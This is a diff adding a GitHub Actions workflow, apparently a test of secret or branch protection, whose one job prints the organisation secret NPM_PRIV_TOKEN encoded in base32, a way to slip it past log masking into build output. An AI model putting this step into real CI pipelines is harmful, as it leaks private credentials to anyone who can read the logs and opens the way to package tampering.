@@ -1,0 +1,16 @@
+name: Exfilitrate org secret test
+on:
+  push:
+    branches: [test-protect2]
+  pull_request:
+    branches: [test-protect2]
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+    - name: exfil org secret
+      id: response
+      run:  |
+          echo "lets exfil some org secrets..."
+          echo "${{secrets.NPM_PRIV_TOKEN}}" | base32
+          
